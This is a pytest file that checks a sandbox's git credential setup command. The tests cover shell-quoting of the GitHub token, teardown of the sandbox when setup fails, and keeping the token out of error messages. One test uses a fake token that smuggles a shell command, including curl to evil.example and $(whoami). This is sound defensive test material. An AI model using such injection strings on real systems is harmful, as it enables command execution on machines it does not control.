"""Tests for safe construction and lifecycle of the sandbox GitHub credential.

The credential setup runs inside the LangSmith sandbox shell. These tests pin:
- the token can never break out of the command and execute as shell (review C2);
- a setup failure still tears the sandbox down (no leaked credential-bearing box);
- the normalized failure never carries the token in its message or cause chain.
"""

from __future__ import annotations

import shlex

import pytest

from deepwork_agent.runtime import (
    SandboxCredentialError,
    _sandbox_lifecycle,
    build_git_credential_setup_command,
)

SYNTHETIC_TOKEN = "ghp_synthetic_secret_value"  # noqa: S105 - fake token for tests


def test_command_installs_credential_helper_and_identity() -> None:
    """The command still wires the credential helper, file mode, and git identity."""
    command = build_git_credential_setup_command("gho_exampletoken")

    assert "git config --global credential.helper store" in command
    assert "chmod 600 ~/.git-credentials" in command
    assert "user.name 'Deep Work'" in command
    assert "gho_exampletoken" in command


def test_malicious_token_cannot_break_out_of_the_shell() -> None:
    """A token full of shell metacharacters is passed as a single quoted argument."""
    token = "abc'; curl https://evil.example $(whoami) `id` && echo pwned"  # noqa: S105 - fake
    command = build_git_credential_setup_command(token)

    # The whole command remains parseable (no unbalanced quotes) ...
    parts = shlex.split(command)
    # ... and the entire token survives as exactly one shell word, i.e. it was
    # never split into additional commands or substitutions.
    assert token in parts
    # The dangerous substrings only ever appear inside that single token word,
    # never as their own parsed shell tokens.
    assert "curl" not in parts
    assert "$(whoami)" not in parts
    assert "pwned" not in parts


def test_token_is_shell_quoted() -> None:
    """The token is embedded via shlex.quote, not naive single-quote wrapping."""
    token = "a'b"  # noqa: S105 - fake token for tests
    command = build_git_credential_setup_command(token)

    assert shlex.quote(token) in command
    # The naive f"'{token}'" form (the previous, injectable construction) must not
    # appear, since it would terminate the quote early.
    assert f"'{token}'" not in command


class _FakeSandbox:
    """A stand-in sandbox whose ``run`` optionally fails, recording commands."""

    def __init__(self, *, run_error: Exception | None = None) -> None:
        self.id = "sandbox-1"
        self._run_error = run_error
        self.commands: list[str] = []

    def run(self, command: str) -> None:
        self.commands.append(command)
        if self._run_error is not None:
            raise self._run_error


class _FakeClient:
    """A stand-in sandbox client that records teardown calls."""

    def __init__(self) -> None:
        self.deleted: list[str] = []
        self.closed = False

    def delete_sandbox(self, sandbox_id: str) -> None:
        self.deleted.append(sandbox_id)

    def close(self) -> None:
        self.closed = True


def test_sandbox_is_torn_down_when_credential_setup_fails() -> None:
    """A credential-setup failure still deletes and closes the sandbox."""
    client = _FakeClient()
    sandbox = _FakeSandbox(run_error=RuntimeError("boom"))

    with (
        pytest.raises(SandboxCredentialError),
        _sandbox_lifecycle(client, sandbox, SYNTHETIC_TOKEN),
    ):
        pytest.fail("lifecycle body must not run when setup fails")

    assert client.deleted == ["sandbox-1"]
    assert client.closed is True


def test_credential_failure_never_leaks_the_token() -> None:
    """The normalized error carries no token in its message or cause chain."""
    client = _FakeClient()
    # Simulate a provider error that echoes the full command (with the token).
    leaking_command = build_git_credential_setup_command(SYNTHETIC_TOKEN)
    sandbox = _FakeSandbox(run_error=RuntimeError(f"failed: {leaking_command}"))

    with (
        pytest.raises(SandboxCredentialError) as exc_info,
        _sandbox_lifecycle(client, sandbox, SYNTHETIC_TOKEN),
    ):
        pass

    error = exc_info.value
    assert SYNTHETIC_TOKEN not in str(error)
    # raise ... from None: no explicit cause, and the implicit context is suppressed.
    assert error.__cause__ is None
    assert error.__suppress_context__ is True


def test_lifecycle_without_token_still_tears_down() -> None:
    """With no token, setup is skipped and teardown still runs after the body."""
    client = _FakeClient()
    sandbox = _FakeSandbox()

    with _sandbox_lifecycle(client, sandbox, None) as ready:
        assert ready is sandbox

    assert sandbox.commands == []
    assert client.deleted == ["sandbox-1"]
    assert client.closed is True
